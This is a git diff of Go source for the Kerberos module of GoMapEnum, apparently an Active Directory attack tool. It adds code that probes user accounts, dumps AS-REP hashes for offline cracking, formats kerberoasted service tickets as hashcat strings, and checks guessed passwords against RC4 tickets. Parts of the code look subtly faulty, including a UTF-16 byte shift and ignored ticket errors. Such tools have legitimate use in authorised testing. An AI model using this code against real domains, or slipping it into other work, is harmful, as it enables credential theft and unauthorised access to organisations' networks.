@@ -2,16 +2,19 @@ package kerberos
 
 import (
 	"GoMapEnum/src/utils"
+	"bytes"
 	"encoding/hex"
 	"fmt"
 	"html/template"
 	"os"
 	"strings"
+	"unicode/utf16"
 
 	kclient "github.com/nodauf/gokrb5/v8/client"
 	kconfig "github.com/nodauf/gokrb5/v8/config"
 	"github.com/nodauf/gokrb5/v8/iana/errorcode"
 	"github.com/nodauf/gokrb5/v8/messages"
+	"golang.org/x/crypto/md4"
 )
 
 const krb5ConfigTemplateDNS = `[libdefaults]
@@ -48,20 +51,18 @@ type KerbruteSessionOptions struct {
 	HashFilename     string
 }
 
-func (options *Options) TestUsername(username string) (bool, error) {
-	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)
+func (options *Options) testUsername(username string) (bool, error) {
 
 	cl := kclient.NewWithPassword(username, options.Domain, utils.RandomString(5), options.kerberosConfig, kclient.DisablePAFXFAST(true), kclient.Proxy(options.ProxyTCP))
 	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
 	if err != nil {
-		fmt.Printf(err.Error())
+		options.Log.Error(err.Error())
 	}
 	b, err := req.Marshal()
 	if err != nil {
 		return false, err
 	}
 	rb, err := cl.SendToKDC(b, options.Domain)
-
 	if err == nil {
 		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
 		var ASRep messages.ASRep
@@ -77,6 +78,7 @@ func (options *Options) TestUsername(username string) (bool, error) {
 		} else {
 			options.Log.Success("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", ASRep.CName.PrincipalNameString(), hash)
 		}
+
 		return true, nil
 	}
 	e, ok := err.(messages.KRBError)
@@ -92,7 +94,37 @@ func (options *Options) TestUsername(username string) (bool, error) {
 	}
 }
 
-func (options *Options) dumpASRepHash(asrep messages.ASRep) {
+func (options *Options) authenticate(username, password string) (*kclient.Client, error) {
+	client := kclient.NewWithPassword(username, options.Domain, password, options.kerberosConfig, kclient.DisablePAFXFAST(true), kclient.Proxy(options.ProxyTCP))
+
+	if ok, err := client.IsConfigured(); !ok {
+		return client, err
+	}
+	err := client.Login()
+	if err == nil {
+		return client, err
+	}
+	eString := err.Error()
+	if strings.Contains(eString, "Password has expired") {
+		// user's password expired, but it's valid!
+		return client, fmt.Errorf("User's password has expired")
+	}
+	if strings.Contains(eString, "Clock skew too great") {
+		// clock skew off, but that means password worked since PRE-AUTH was successful
+		return client, fmt.Errorf("Clock skew is too great")
+	}
+	return client, err
+}
+
+func kerberoasting(cl *kclient.Client, username, spn string) string {
+	// Just test kerberoasting
+	ticket, _, _ := cl.GetServiceTicket(spn)
+	switch ticket.EncPart.EType {
+	case 23:
+		return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", ticket.EncPart.EType, username, ticket.Realm, strings.ReplaceAll(spn, ":", "~"), hex.EncodeToString(ticket.EncPart.Cipher[0:16]), hex.EncodeToString(ticket.EncPart.Cipher[16:]))
+
+	}
+	return ""
 }
 
 func buildKrb5Template(realm, domainController string) string {
@@ -160,4 +192,38 @@ func asRepToHashcat(asrep messages.ASRep) (string, error) {
 		asrep.CRealm,
 		hex.EncodeToString(asrep.EncPart.Cipher[:16]),
 		hex.EncodeToString(asrep.EncPart.Cipher[16:])), nil
+}
+
+// credits: https://github.com/leechristensen/tgscrack/blob/master/tgscrack.go
+func decryptTGS(encryptionPartHex, checksumHex, password string) (bool, error) {
+
+	checksum, _ := hex.DecodeString(checksumHex)
+	encryptionPart, _ := hex.DecodeString(encryptionPartHex)
+
+	// Convert the password to NTLM
+	cipher := md4.New()
+	encoded := utf16.Encode([]rune(password))
+	// TODO: I'm sure there is an easier way to do the conversion from utf16 to bytes
+	result := make([]byte, len(encoded)*2)
+	for i := 0; i < len(encoded); i++ {
+		result[i*2] = byte(encoded[i])
+		result[i*2+1] = byte(encoded[i] << 8)
+	}
+	cipher.Write(result)
+	ntlm := cipher.Sum(nil)
+
+	// Decrypt the encryptionPart
+	messageType := byte(2)
+	mtype := []byte{messageType, 0, 0, 0}
+
+	K1 := utils.GetHmacMd5(mtype, ntlm)
+	K2 := K1 // Not necessary since we're not doing exports, but whatev
+	K3 := utils.GetHmacMd5(checksum, K1)
+	decData, _ := utils.RC4Decrypt(encryptionPart, K3)
+
+	// TODO: (Optimization) Get rid of last HMAC. Instead verify domain or check for a consistent value in decrypted service ticket
+	verifyChecksum := utils.GetHmacMd5(decData, K2)
+
+	return bytes.Equal(verifyChecksum, checksum), nil
+
 }
